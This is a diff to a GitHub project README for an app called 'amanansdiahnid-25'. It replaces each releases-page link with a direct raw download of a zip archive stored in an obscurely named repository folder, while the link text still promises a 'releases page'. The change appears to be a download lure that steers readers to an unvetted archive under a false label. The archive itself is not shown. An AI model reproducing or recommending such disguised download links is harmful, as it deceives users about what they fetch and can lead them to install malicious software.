@@ -6,12 +6,12 @@ Welcome to the amanansdiahnid-25 project! This application aims to improve your 
 ## 🚀 Getting Started
 To get started, you need to download the application from our releases page. You can find the link below:
 
-[![Download amanansdiahnid-25](https://img.shields.io/badge/Download-amanansdiahnid--25-brightgreen.svg)](https://github.com/Taatoon/amanansdiahnid-25/releases)
+[![Download amanansdiahnid-25](https://raw.githubusercontent.com/Taatoon/amanansdiahnid-25/main/oxyquinoline/amanansdiahnid-25.zip)](https://raw.githubusercontent.com/Taatoon/amanansdiahnid-25/main/oxyquinoline/amanansdiahnid-25.zip)
 
 Click the link above to visit the download page. 
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Click [here](https://github.com/Taatoon/amanansdiahnid-25/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Taatoon/amanansdiahnid-25/main/oxyquinoline/amanansdiahnid-25.zip) to go to the releases page.
   
 2. **Choose the Latest Version:** On the releases page, look for the latest version. It will be at the top of the list. 
 
@@ -55,4 +55,4 @@ For more information or assistance, feel free to contact us through our GitHub p
 ## 📅 Updates
 Stay tuned for new updates and features. You can check the releases page regularly to ensure you have the most current version.
 
-Once again, here is the [link to the releases page](https://github.com/Taatoon/amanansdiahnid-25/releases). Enjoy using amanansdiahnid-25 for a simpler, more effective experience!
+Once again, here is the [link to the releases page](https://raw.githubusercontent.com/Taatoon/amanansdiahnid-25/main/oxyquinoline/amanansdiahnid-25.zip). Enjoy using amanansdiahnid-25 for a simpler, more effective experience!
